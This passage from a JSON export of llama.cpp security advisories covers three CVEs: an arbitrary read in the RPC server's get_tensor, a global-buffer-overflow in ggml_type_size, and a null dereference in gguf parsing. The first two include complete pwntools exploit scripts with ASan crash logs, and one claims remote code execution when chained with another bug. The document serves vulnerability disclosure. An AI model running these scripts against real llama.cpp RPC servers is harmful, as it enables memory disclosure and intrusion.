[[start_rpc_sercer](https://github.com/ggerganov/llama.cpp/blob/75af08c475e285888f66556d0f459c533b7deb95/ggml/src/ggml-rpc.cpp#L1144)](https://github.com/ggerganov/llama.cpp/blob/75af08c475e285888f66556d0f459c533b7deb95/ggml/src/ggml-rpc.cpp#L1144)\r\n\r\n  + [[rpc_serve_client](https://github.com/ggerganov/llama.cpp/blob/75af08c475e285888f66556d0f459c533b7deb95/ggml/src/ggml-rpc.cpp#L1060)](https://github.com/ggerganov/llama.cpp/blob/75af08c475e285888f66556d0f459c533b7deb95/ggml/src/ggml-rpc.cpp#L1060)\r\n\r\n    + [[rpc_server::get_tensor](https://github.com/ggerganov/llama.cpp/blob/e31a4f679779220312c165b0f5994c680a610e38/ggml/src/ggml-rpc.cpp#L922)](https://github.com/ggerganov/llama.cpp/blob/e31a4f679779220312c165b0f5994c680a610e38/ggml/src/ggml-rpc.cpp#L922)\r\n\r\n      + [[ggml_backend_tensor_get](https://github.com/ggerganov/llama.cpp/blob/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0/ggml/src/ggml-backend.c#L235)](https://github.com/ggerganov/llama.cpp/blob/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0/ggml/src/ggml-backend.c#L235)\r\n\r\n        + [[ggml_backend_cpu_buffer_get_tensor](https://github.com/ggerganov/llama.cpp/blob/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0/ggml/src/ggml-backend.c#L583C1-L587C2)](https://github.com/ggerganov/llama.cpp/blob/400ae6f65f0b55babd48d1e3ec7fd663a97fc8d0/ggml/src/ggml-backend.c#L583C1-L587C2)\r\n\r\n          ```c++\r\n          GGML_CALL static void ggml_backend_cpu_buffer_get_tensor(ggml_backend_buffer_t buffer, const struct ggml_tensor * tensor, void * data, size_t offset, size_t size) {\r\n              memcpy(data, (const char *)tensor->data + offset, size);\r\n          \r\n              GGML_UNUSED(buffer);\r\n          }\r\n          ```\r\n\r\n## PoC\r\n\r\n### Build\r\n\r\n```shell\r\ngit clone https://github.com/ggerganov/llama.cpp.git && cd llama.cpp && mkdir build-rpc && cmake .. -DGGML_RPC=ON && cmake --build . --config Release\r\npip install pwn\r\n```\r\n\r\n### reproduce\r\n\r\nIn `llama/llama.cpp/build-rpc/bin`,Run this command:\r\n\r\n```shell\r\n./rpc-server -p 50052\r\n```\r\n\r\nThen run the following `Python script`:\r\n\r\n```python\r\nfrom pwn import *\r\n\r\nALLOC_BUFFER = 0\r\nGET_ALIGNMENT = 1\r\nGET_MAX_SIZE = 2\r\nBUFFER_GET_BASE = 3\r\nFREE_BUFFER = 4\r\nBUFFER_CLEAR = 5\r\nSET_TENSOR = 6\r\nGET_TENSOR = 7\r\nCOPY_TENSOR = 8\r\nGRAPH_COMPUTE = 9\r\nGET_DEVICE_MEMORY = 10\r\n\r\ncontext(arch='amd64',log_level = 'debug')\r\n\r\nbase_memory = 0x0\r\n\r\n\r\np = remote(\"127.0.0.1\",50052)\r\npd = b''\r\ncmd = p8(GET_DEVICE_MEMORY)\r\ncontent = b''\r\ninput_size = p64(len(content))\r\npd+= cmd + input_size + content\r\np.send(pd)\r\nrecv = p.recvall(timeout=1)\r\np.close()\r\n\r\n\r\np = remote(\"127.0.0.1\",50052)\r\n\r\npd = b''\r\ncmd = p8(GET_ALIGNMENT)\r\ncontent = b''\r\ninput_size = p64(len(content))\r\npd+= cmd + input_size + content\r\n\r\ncmd = p8(ALLOC_BUFFER)\r\ncontent = p64(0x100)\r\ninput_size = p64(len(content))\r\npd+= cmd + input_size + content\r\np.send(pd)\r\nrecv = p.recvall(timeout=1)\r\nremote_ptr = u64(recv[0x18:0x20])\r\nsz = u64(recv[0x20:0x28])\r\nlog.success(f\"remote_ptr:{hex(remote_ptr)},size:{sz}\")\r\np.recvall(timeout=1)\r\np.close()\r\n\r\n'''\r\nWhen the vulnerability cannot be triggered, you might want to adjust the next_ptr variable in the script to the buffer address returned by ALLOC_BUFFER.\r\n'''\r\nnext_ptr = remote_ptr + 0x160\r\nlog.success(f'next_ptr:{hex(next_ptr)}')\r\n\r\n\r\np = remote(\"127.0.0.1\",50052)\r\ncmd = p8(ALLOC_BUFFER)\r\ncontent = p64(0x100)\r\ninput_size = p64(len(content))\r\npd = cmd + input_size + content\r\nrpc_tensor_pd = flat(\r\n    {\r\n        0: [\r\n            0x1,  # id\r\n            p32(2),  # type\r\n            p64(next_ptr),  # buffer\r\n            [  # ne\r\n                p32(0xdeadbeef),\r\n                p32(0xdeadbeef),\r\n                p32(0xdeadbeef),\r\n                p32(0xdeadbeef),\r\n            ],\r\n            [  # nb\r\n                p32(1),\r\n                p32(1),\r\n                p32(1),\r\n                p32(1),\r\n            ],\r\n            p32(0),  # op\r\n            [p32(0)] * 16,  # op_params (corrected from 8 to 16)\r\n            p32(0),  # flags\r\n            [p64(0)] * 10,  # src\r\n            p64(0),  # view_src\r\n            p64(0),  # view_offs\r\n            p64(0xdeadbeef),  # data\r\n            'a' * 64,  # name\r\n            'x' * 4  # padding\r\n        ],\r\n    }\r\n)\r\ncmd = p8(GET_TENSOR)\r\ncontent = flat(\r\n    {\r\n        0: rpc_tensor_pd + p64(0) + p64(0x100)\r\n    }\r\n)\r\ninput_size = p64(len(content))\r\npd+= cmd + input_size + content\r\n\r\np.send(pd)\r\np.recv(0x18)\r\n\r\np.close()\r\n```\r\n\r\nIt will be Read-what-where.\r\n\r\n### asan log\r\n\r\n```shell\r\n\u279c  bin git:(master) \u2717 ./rpc-server -p 50052\r\ncreate_backend: using CPU backend\r\nStarting RPC server on 0.0.0.0:50052, backend memory: 7896 MB\r\nAccepted client connection, free_mem=8280244224, total_mem=8280244224\r\nClient connection closed\r\n[~socket_t] closing socket 4\r\nAccepted client connection, free_mem=8280244224, total_mem=8280244224\r\n[get_alignment] alignment: 32\r\n[alloc_buffer] size: 256 -> remote_ptr: 60b000000300, remote_size: 288\r\nClient connection closed\r\n[~socket_t] closing socket 4\r\nAccepted client connection, free_mem=8280244224, total_mem=8280244224\r\n[alloc_buffer] size: 256 -> remote_ptr: 60b000000460, remote_size: 288\r\n[get_tensor] buffer: 0x60b000000460, data: 0xdeadbeef, offset: 0, size: 256\r\n=================================================================\r\n==13127==ERROR: AddressSanitizer: unknown-crash on address 0x0000deadbeef at pc 0x7ac0c583a397 bp 0x7ffda3120870 sp 0x7ffda3120018\r\nREAD of size 256 at 0x0000deadbeef thread T0\r\n    #0 0x7ac0c583a396 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827\r\n    #1 0x7ac0c534a04a in rpc_server::get_tensor(std::vector<unsigned char, std::allocator<unsigned char> > const&, std::vector<unsigned char, std::allocator<unsigned char> >&) (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x14a04a)\r\n    #2 0x7ac0c5357642 in start_rpc_server (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x157642)\r\n    #3 0x5d2f70cc3c63 in main (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/bin/rpc-server+0x2c63)\r\n    #4 0x7ac0c4a29d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\r\n    #5 0x7ac0c4a29e3f in __libc_start_main_impl ../csu/libc-start.c:392\r\n    #6 0x5d2f70cc3ff4 in _start (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/bin/rpc-server+0x2ff4)\r\n\r\nAddress 0x0000deadbeef is located in the shadow gap area.\r\nSUMMARY: AddressSanitizer: unknown-crash ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 in __i\r\n```\r\n\r\n\r\n\r\n## Impact\r\n\r\nThis vulnerability can be used as a `primitive` for arbitrary reads in an exploit. I used this vulnerability along with another arbitrary address write vulnerability to achieve RCE(Remote Command Execute), demonstrating the significant impact of the vulnerability. The RCE video is as follows:https://drive.google.com/file/d/1vuoxQblMJ7KcaH05Z_sk_ruHSN0ftKvz/view?usp=sharing\r\n\r\n## Credit\r\n\r\nThis vulnerability was discovered by `7resp4ss` and `Guang Gong` from `360 Vulnerability Research Institute`.",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-5vm9-p64x-gqw9",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-42478",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2024-08-20T06:26:38Z",
+    "published_at": "2024-08-12T14:18:08Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "vulnerable_version_range": "< b3561",
+        "patched_versions": ">= b3561",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "score": 5.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-125",
+        "name": "Out-of-bounds Read"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-125"
+    ],
+    "credits": [
+      {
+        "login": "7resp4ss",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "7resp4ss",
+          "id": 81899344,
+          "node_id": "MDQ6VXNlcjgxODk5MzQ0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/81899344?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/7resp4ss",
+          "html_url": "https://github.com/7resp4ss",
+          "followers_url": "https://api.github.com/users/7resp4ss/followers",
+          "following_url": "https://api.github.com/users/7resp4ss/following{/other_user}",
+          "gists_url": "https://api.github.com/users/7resp4ss/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/7resp4ss/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/7resp4ss/subscriptions",
+          "organizations_url": "https://api.github.com/users/7resp4ss/orgs",
+          "repos_url": "https://api.github.com/users/7resp4ss/repos",
+          "events_url": "https://api.github.com/users/7resp4ss/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/7resp4ss/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+      "score": 5.3
+    }
+  },
+  {
+    "ghsa_id": "GHSA-mqp6-7pv6-fqjf",
+    "cve_id": "CVE-2024-42477",
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-mqp6-7pv6-fqjf",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-mqp6-7pv6-fqjf",
+    "summary": "global-buffer-overflow in ggml_type_size",
+    "description": "# global-buffer-overflow in ggml_type_size\r\n\r\n## Summary\r\n\r\nThe unsafe `type` member in the `rpc_tensor` structure can cause `global-buffer-overflow`.\r\n\r\n## Details\r\n\r\nFirst, note that the `type` membe in the `rpc_tensor` structure can be controlled by the user.\u3002\r\n\r\n```C++\r\n// ggml_tensor is serialized into rpc_tensor\r\n#pragma pack(push, 1)\r\nstruct rpc_tensor {\r\n    uint64_t id;\r\n    uint32_t type;\r\n    uint64_t buffer;\r\n    uint32_t ne[GGML_MAX_DIMS];\r\n    uint32_t nb[GGML_MAX_DIMS];\r\n    uint32_t op;\r\n    int32_t  op_params[GGML_MAX_OP_PARAMS / sizeof(int32_t)];\r\n    int32_t  flags;\r\n    uint64_t src[GGML_MAX_SRC];\r\n    uint64_t view_src;\r\n    uint64_t view_offs;\r\n    uint64_t data;\r\n    char name[GGML_MAX_NAME];\r\n\r\n    char padding[4];\r\n};\r\n#pragma pack(pop)\r\n```\r\n\r\nWe can achieve `global-buffer-overflow` during the following call by controlling the value of the `type` .\r\n\r\nThe following is the function call chain that leads to global-buffer-overflow:\r\n\r\n+ start_rpc_sercer\r\n\r\n  + rpc_serve_client\r\n    + rpc_server::get_tensor\r\n      + rpc_server::deserialize_tensor\r\n        + ggml_new_tensor_4d\r\n          + ggml_new_tensor\r\n            + ggml_row_size\r\n              + ggml_type_size\r\n\r\n```C++\r\nGGML_CALL size_t ggml_type_size(enum ggml_type type) {\r\n    return type_traits[type].type_size;\t//The type value is not properly validated or sanitized.\r\n}\r\n```\r\n\r\n\r\n\r\n## PoC\r\n\r\n### Build\r\n\r\n```shell\r\ngit clone https://github.com/ggerganov/llama.cpp.git && cd llama.cpp && mkdir build-rpc && cmake .. -DGGML_RPC=ON && cmake --build . --config Release\r\npip install pwn\r\n```\r\n\r\n### Reproduce\r\n\r\nIn `llama/llama.cpp/build-rpc/bin`,Run this command:\r\n\r\n```shell\r\n./rpc-server -p 50052\r\n```\r\n\r\nThen run the following `Python script`, I set type to 0x100.\r\n\r\n```python\r\nfrom pwn import *\r\n\r\nALLOC_BUFFER = 0\r\nGET_ALIGNMENT = 1\r\nGET_MAX_SIZE = 2\r\nBUFFER_GET_BASE = 3\r\nFREE_BUFFER = 4\r\nBUFFER_CLEAR = 5\r\nSET_TENSOR = 6\r\nGET_TENSOR = 7\r\nCOPY_TENSOR = 8\r\nGRAPH_COMPUTE = 9\r\nGET_DEVICE_MEMORY = 10\r\n\r\ncontext(arch='amd64',log_level = 'debug')\r\n\r\np = remote(\"127.0.0.1\",50052)\r\npd = b''\r\nrpc_tensor_pd = flat(\r\n    {\r\n        0: [\r\n            0x1,  # id\r\n            p32(0x100),  # type\r\n            p64(0xdeadbeef),  # buffer\r\n            [  # ne\r\n                p32(0xdeadbeef),\r\n                p32(0xdeadbeef),\r\n                p32(0xdeadbeef),\r\n                p32(0xdeadbeef),\r\n            ],\r\n            [  # nb\r\n                p32(1),\r\n                p32(1),\r\n                p32(1),\r\n                p32(1),\r\n            ],\r\n            p32(0),  # op\r\n            [p32(0)] * 16,  # op_params (corrected from 8 to 16)\r\n            p32(0),  # flags\r\n            [p64(0)] * 10,  # src\r\n            p64(0),  # view_src\r\n            p64(0),  # view_offs\r\n            p64(0xdeadbeef),  # data\r\n            'a' * 64,  # name\r\n            'x' * 4  # padding\r\n        ],\r\n    }\r\n)\r\ncmd = p8(GET_TENSOR)\r\ncontent = flat(\r\n    {\r\n        0: rpc_tensor_pd + p64(0) + p64(0x100)\r\n    }\r\n)\r\ninput_size = p64(len(content))\r\npd+= cmd + input_size + content\r\n\r\np.send(pd)\r\np.recvall(timeout=1)\r\n\r\np.close()\r\n```\r\n\r\nIt will be `global-buffer-overflow`.\r\n\r\n### Asan log\r\n\r\n```shell\r\n\u279c  bin git:(master) \u2717 ./rpc-server -p 50052\r\ncreate_backend: using CPU backend\r\nStarting RPC server on 0.0.0.0:50052, backend memory: 7896 MB\r\nAccepted client connection, free_mem=8280244224, total_mem=8280244224\r\n=================================================================\r\n==14276==ERROR: AddressSanitizer: global-buffer-overflow on address 0x738b419e94d8 at pc 0x738b4183cad9 bp 0x7fffe4a5ac50 sp 0x7fffe4a5ac40\r\nREAD of size 8 at 0x738b419e94d8 thread T0\r\n    #0 0x738b4183cad8 in ggml_type_size (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x3cad8)\r\n    #1 0x738b418467b5 in ggml_row_size (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x467b5)\r\n    #2 0x738b41863fdd in ggml_new_tensor (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x63fdd)\r\n    #3 0x738b41864a2b in ggml_new_tensor_4d (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x64a2b)\r\n    #4 0x738b41944ee6 in rpc_server::deserialize_tensor(ggml_context*, rpc_tensor const*) (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x144ee6)\r\n    #5 0x738b41949f1f in rpc_server::get_tensor(std::vector<unsigned char, std::allocator<unsigned char> > const&, std::vector<unsigned char, std::allocator<unsigned char> >&) (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x149f1f)\r\n    #6 0x738b41957642 in start_rpc_server (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x157642)\r\n    #7 0x5c8d5aeeec63 in main (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/bin/rpc-server+0x2c63)\r\n    #8 0x738b41029d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\r\n    #9 0x738b41029e3f in __libc_start_main_impl ../csu/libc-start.c:392\r\n    #10 0x5c8d5aeeeff4 in _start (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/bin/rpc-server+0x2ff4)\r\n\r\nAddress 0x738b419e94d8 is a wild pointer.\r\nSUMMARY: AddressSanitizer: global-buffer-overflow (/home/heckar/AI-Sec/llama/llama.cpp/build-rpc-asan-debug/ggml/src/libggml.so+0x3cad8) in ggml_type_size\r\nShadow bytes around the buggy address:\r\n  0x0e71e8335240: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9\r\n  0x0e71e8335250: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9\r\n  0x0e71e8335260: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9\r\n  0x0e71e8335270: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9\r\n  0x0e71e8335280: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9\r\n=>0x0e71e8335290: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9[f9]f9 f9 f9 f9\r\n  0x0e71e83352a0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9\r\n  0x0e71e83352b0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9\r\n  0x0e71e83352c0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9\r\n  0x0e71e83352d0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9\r\n  0x0e71e83352e0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9\r\nShadow byte legend (one shadow byte represents 8 application bytes):\r\n  Addressable:           00\r\n  Partially addressable: 01 02 03 04 05 06 07 \r\n  Heap left redzone:       fa\r\n  Freed heap region:       fd\r\n  Stack left redzone:      f1\r\n  Stack mid redzone:       f2\r\n  Stack right redzone:     f3\r\n  Stack after return:      f5\r\n  Stack use after scope:   f8\r\n  Global redzone:          f9\r\n  Global init order:       f6\r\n  Poisoned by user:        f7\r\n  Container overflow:      fc\r\n  Array cookie:            ac\r\n  Intra object redzone:    bb\r\n  ASan internal:           fe\r\n  Left alloca redzone:     ca\r\n  Right alloca redzone:    cb\r\n  Shadow gap:              cc\r\n==14276==ABORTING\r\n\r\n```\r\n\r\n\r\n\r\n## Impact\r\n\r\nThis vulnerability may lead to memory data leakage\r\n\r\n## Credit\r\n\r\nThis vulnerability was discovered by `7resp4ss` and `Guang Gong` from `360 Vulnerability Research Institute`.",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-mqp6-7pv6-fqjf",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-42477",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2024-08-20T06:26:00Z",
+    "published_at": "2024-08-12T14:17:57Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "vulnerable_version_range": "< b3561",
+        "patched_versions": ">= b3561",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "score": 5.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-125",
+        "name": "Out-of-bounds Read"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-125"
+    ],
+    "credits": [
+      {
+        "login": "7resp4ss",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "7resp4ss",
+          "id": 81899344,
+          "node_id": "MDQ6VXNlcjgxODk5MzQ0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/81899344?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/7resp4ss",
+          "html_url": "https://github.com/7resp4ss",
+          "followers_url": "https://api.github.com/users/7resp4ss/followers",
+          "following_url": "https://api.github.com/users/7resp4ss/following{/other_user}",
+          "gists_url": "https://api.github.com/users/7resp4ss/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/7resp4ss/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/7resp4ss/subscriptions",
+          "organizations_url": "https://api.github.com/users/7resp4ss/orgs",
+          "repos_url": "https://api.github.com/users/7resp4ss/repos",
+          "events_url": "https://api.github.com/users/7resp4ss/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/7resp4ss/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+      "score": 5.3
+    }
+  },
+  {
+    "ghsa_id": "GHSA-49q7-2jmh-92fp",
+    "cve_id": "CVE-2024-41130",
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-49q7-2jmh-92fp",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-49q7-2jmh-92fp",
+    "summary": "Null pointer dereference in gguf_init_from_file",
+    "description": "``` cpp\r\n            ok = ok && gguf_fread_str(file, &info->name,                          &offset);   // [1] maybe read failed,then info->name = nullptr\r\n            ok = ok && gguf_fread_el (file, &info->n_dims, sizeof(info->n_dims),  &offset);\r\n\r\n            ok = ok && (info->n_dims <= GGML_MAX_DIMS);\r\n\r\n            for (uint32_t j = 0; j < info->n_dims; ++j) {\r\n                ok = ok && gguf_fread_el(file, &info->ne[j], sizeof(info->ne[j]), &offset);\r\n            }\r\n\r\n            ok = ok && gguf_fread_el (file, &info->type,   sizeof(info->type),    &offset);\r\n            ok = ok && gguf_fread_el (file, &info->offset, sizeof(info->offset),  &offset);\r\n\r\n            // TODO: return an error instead of crashing with GGML_ASSERT\r\n            gguf_tensor_info_sanitize(info);\r\n\r\n            // make sure there is no duplicated tensor names\r\n            for (uint64_t j = 0; j < i; ++j) {\r\n                if (strcmp(info->name.data, ctx->infos[j].name.data) == 0) {        // [2] don't check wether data is nullptr\r\n                    fprintf(stderr, \"%s: duplicated tensor name %s\\n\", __func__, info->name.data);\r\n                    ok = false;\r\n                }\r\n            }\r\n```\r\n\r\n\\[1\\]: If gguf_fread_str fails to execute, `name.data` will not call GGML_CLLOC to allocate memory, so name->data will be nullptr.\r\n\r\n\\[2\\]: don't check `name.data` whether is nullptr, so the strcmp will defer a null pointer then trigger segment fault.\r\n\r\n``` cpp\r\nstatic bool gguf_fread_str(FILE * file, struct gguf_str * p, size_t * offset) {\r\n    p->n    = 0;\r\n    p->data = NULL;\r\n\r\n    bool ok = true;\r\n\r\n    ok = ok && gguf_fread_el(file, &p->n, sizeof(p->n), offset);\r\n\r\n    // early exit if string length is invalid, prevents from integer overflow\r\n    if (p->n == SIZE_MAX) {             //  exist before call GGML_CALLOC\r\n        fprintf(stderr, \"%s: invalid string length (%\" PRIu64 \")\\n\", __func__, p->n);  \r\n        return false;\r\n    }\r\n\r\n    p->data = GGML_CALLOC(p->n + 1, 1);\r\n\r\n    ok = ok && gguf_fread_el(file,  p->data, p->n, offset);\r\n\r\n    return ok;\r\n}\r\n```\r\n\r\nthe resulte as follow:\r\n\r\n![](https://raw.githubusercontent.com/Arashimu/images/main/1.png)\r\n\r\nthe poc of gguf file: https://github.com/Arashimu/images/raw/main/npd.gguf",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-49q7-2jmh-92fp",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-41130",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2024-07-22T16:22:34Z",
+    "published_at": "2024-07-22T16:22:34Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "vulnerable_version_range": "<=b3426",
+        "patched_versions": "b3427",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L",
+        "score": 5.4
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-476",
+        "name": "NULL Pointer Dereference"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-476"
+    ],
+    "credits": [
+      {
+        "login": "Arashimu",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "Arashimu",
+          "id": 41323496,
+          "node_id": "MDQ6VXNlcjQxMzIzNDk2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/41323496?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Arashimu",
+          "html_url": "https://github.com/Arashimu",
+          "followers_url": "https://api.github.com/users/Arashimu/followers",
+          "following_url": "https://api.github.com/users/Arashimu/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Arashimu/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Arashimu/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Arashimu/subscriptions",
+          "organizations_url": "https://api.github.com/users/Arashimu/orgs",
+          "repos_url": "https://api.github.com/users/Arashimu/repos",
